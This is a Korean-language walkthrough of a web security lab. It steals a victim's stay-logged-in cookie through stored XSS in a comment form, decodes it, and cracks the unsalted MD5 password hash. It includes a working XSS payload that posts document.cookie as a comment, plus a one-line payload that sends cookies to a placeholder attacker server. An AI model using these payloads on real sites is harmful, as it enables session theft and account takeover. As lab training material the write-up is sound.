# 🚩Lab: Offline password cracking

```text
This lab stores the user's password hash in a cookie.
The lab also contains an XSS vulnerability in the comment functionality.
To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password.
Then, log in as carlos and delete his account from the "My account" page.

Your credentials: wiener:peter
Victim's username: carlos
```

### 🔍 분석 및 공격 과정
1. wiener:peter로 로그인해본다.
```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC
Set-Cookie: session=ksU6SltDa6VipYrN34lHaO8kwURu4j8Y; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
2. `stay-logged-in` 쿠키의 값은 base64(username:MD5(password))로 이루어져 있다.
3. salt가 없기에 carlos의 stay-logged-in 쿠키를 탈취해 비밀번호를 크래킹하는게 충분히 가능하다.
4. 이 쿠키는 SameSite 옵션이 설정되어 있지 않아 브라우저의 기본 설정을 따를 것이다. 해당 랩환경에서는 `SameSite=Lax`이다. cross origin으로 전송할려면 최상위 프레임이동 혹은 GET요청이여야 한다.
5. 그러나, 확인 결과 cross origin을 고려할 것 까지도 없이 post의 comment기능에 `stored xss` 취약점이 존재한다.
6. HttpOnly 옵션도 없으니 그냥 xss로 쿠키를 커멘트에 작성하도록 만드는 페이로드를 작성해봤다.
```html
<script>
    var f = document.createElement('form');
    f.action = '/post/comment';
    f.method= 'POST';
    var i1 = document.createElement('input');i1.name='comment';i1.value=document.cookie;
    var i2 = document.createElement('input');i2.name='name';i2.value='hacked';
    var i3 = document.createElement('input');i3.name='email';i3.value='you@are.hacked';
    var i4 = document.createElement('input');i4.name='website';i4.value=''
    var i5 = document.createElement('input');i5.name='postId';i5.value='7';
    f.appendChild(i1);f.appendChild(i2);f.appendChild(i3);f.appendChild(i4);f.appendChild(i5);
    document.body.appendChild(f);
    f.submit();
</script>
```
7. 해당 게시글에 달린 피해자의 쿠키 체크
```text
secret=87VtbQMKLkN4D8pKl7qU6GmIyxzv5R7b; stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```
8. `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`를 base64 디코딩 -> `carlos:26323c16d5f4dabff3bb136f2460a943`
9. `26323c16d5f4dabff3bb136f2460a943`를 MD5 테이블에서 조회
10. `onceuponatime`로 검색됨.
11. `carlos:onceuponatime`로 로그인하여 계정삭제 -> solve

> [!NOTE]
> 이 랩에서는 익스플로잇 서버가 존재해서 익스플로잇 서버의 log에 자신의 쿠키를 기록하는 XSS 스크립트도 짜볼 수 있다.<br>
> 단순히 `location = '//공격자서버/' +  document.cookie;`를 작성하면 되기에 더 간단하다.                    
### 💡 취약점 원리
 password를 쿠키에 포함 시키면서 salt가 존재하지 않아 MD5 해시값이 쉽게 크래킹되었고, comment기능에 XSS 취약점이 존재했다.
